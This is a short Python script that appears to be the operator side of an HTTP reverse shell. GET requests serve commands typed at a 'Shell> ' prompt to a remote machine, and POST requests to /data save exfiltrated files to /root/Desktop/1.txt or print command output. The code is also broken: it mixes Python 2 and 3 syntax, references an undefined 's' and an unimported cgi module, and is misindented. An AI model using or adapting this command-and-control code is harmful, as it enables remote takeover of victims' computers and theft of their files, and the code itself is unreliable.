import http.server

HOST_NAME = "192.168.1.12"
HOST_PORT = 8080

class MyHandler(http.server.BaseHTTPRequestHandler):

   def do_GET(self):
       command = input("Shell> ")
       self.send_response(200)
       self.send_header("Content-type", "text/html")
       self.end_headers()
       self.wfile.write(command.encode())

   def do_POST(self):
        if s.path == '/data':
            try:
                ctype, pdict = cgi.parse_header(s.headers.getheader('content-type'))
                if ctype == 'multipart/form-data' :
                    fs = cgi.FieldStorage( fp = s.rfile, 
                                        headers = s.headers, 
                                        environ={ 'REQUEST_METHOD':'POST' } 
                                      )
                else:
                    print "[-] Unexpected POST request"
                fs_up = fs['file']
                with open('/root/Desktop/1.txt', 'wb') as o:
                    o.write( fs_up.file.read() )
                    s.send_response(200)
                    s.end_headers()
            except Exception as e:
                print e
            return       
         self.send_response(200)
         self.end_headers()
         length = int(self.headers['Content-length'])
         postVar = self.rfile.read(length)
         print(postVar.decode())

if __name__ == "__main__":
    server_class = http.server.HTTPServer
    httpd = server_class((HOST_NAME, HOST_PORT), MyHandler)
    try:
       httpd.serve_forever()
    except KeyboardInterrupt:
       print('Server is terminated') 
       httpd.server_close()
